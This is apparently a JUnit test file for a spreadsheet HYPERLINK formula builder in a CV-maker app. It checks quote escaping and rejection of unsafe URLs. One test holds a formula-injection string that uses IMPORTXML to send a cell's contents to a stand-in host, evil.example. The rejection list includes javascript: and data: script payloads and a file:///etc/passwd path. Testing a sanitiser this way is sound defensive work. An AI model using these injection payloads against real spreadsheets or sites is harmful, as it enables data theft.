package com.cvmaker.application.management.sheets;

import static org.assertj.core.api.Assertions.assertThat;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.NullAndEmptySource;
import org.junit.jupiter.params.provider.ValueSource;

class HyperlinkFormulaTest {

    @Test
    void buildsFormulaForPlainHttpsUrl() {
        assertThat(HyperlinkFormula.build("https://example.com/jobs/42?ref=mail", "Apply"))
                .contains("=HYPERLINK(\"https://example.com/jobs/42?ref=mail\", \"Apply\")");
    }

    @Test
    void acceptsHttpAndUpperCaseSchemeAndTrimsWhitespace() {
        assertThat(HyperlinkFormula.build("  http://example.com  ", "x"))
                .contains("=HYPERLINK(\"http://example.com\", \"x\")");
        assertThat(HyperlinkFormula.build("HTTPS://Example.com/A", "x"))
                .contains("=HYPERLINK(\"HTTPS://Example.com/A\", \"x\")");
    }

    @Test
    void doublesQuotesSoTheUrlCannotLeaveTheStringLiteral() {
        String attack = "https://evil.example/\",\"x\")&IMPORTXML(\"https://evil.example/steal?d=\"&A1,\"//a\")&(\"";

        String formula = HyperlinkFormula.build(attack, "Apply").orElseThrow();

        assertThat(formula)
                .startsWith("=HYPERLINK(\"https://evil.example/\"\",\"\"x\"\")&IMPORTXML(")
                .endsWith("\", \"Apply\")");
        // The only unescaped quotes left are the four that delimit the two arguments.
        assertThat(formula.replace("\"\"", "").chars().filter(c -> c == '"').count()).isEqualTo(4);
    }

    @Test
    void escapesQuotesInTheLabel() {
        assertThat(HyperlinkFormula.build("https://example.com", "say \"hi\""))
                .contains("=HYPERLINK(\"https://example.com\", \"say \"\"hi\"\"\")");
    }

    @Test
    void nullLabelBecomesEmptyText() {
        assertThat(HyperlinkFormula.build("https://example.com", null))
                .contains("=HYPERLINK(\"https://example.com\", \"\")");
    }

    @ParameterizedTest
    @NullAndEmptySource
    @ValueSource(strings = {
        "   ",
        "example.com/jobs",
        "www.example.com",
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "file:///etc/passwd",
        "ftp://example.com/file",
        "mailto:someone@example.com",
        "=IMPORTXML(\"https://evil.example\",\"//a\")",
        "\"&IMPORTRANGE(\"x\",\"y\")&\"",
        "https://",
        "https:///path-without-host",
        "http://?query",
        "https://\"quoted",
        "https://example.com/a\nb",
        "https://example.com/a\tb",
        "https://example.com/a\u0000b",
        "N/A",
        "null"
    })
    void rejectsEverythingThatIsNotAPlainHttpUrl(String url) {
        assertThat(HyperlinkFormula.safeUrl(url)).isEmpty();
        assertThat(HyperlinkFormula.isSafeUrl(url)).isFalse();
        assertThat(HyperlinkFormula.build(url, "Apply")).isEmpty();
    }

    @Test
    void rejectsOverlongUrl() {
        String justOk = "https://example.com/" + "a".repeat(HyperlinkFormula.MAX_URL_LENGTH - 20);
        String tooLong = justOk + "a";

        assertThat(HyperlinkFormula.isSafeUrl(justOk)).isTrue();
        assertThat(HyperlinkFormula.isSafeUrl(tooLong)).isFalse();
    }
}
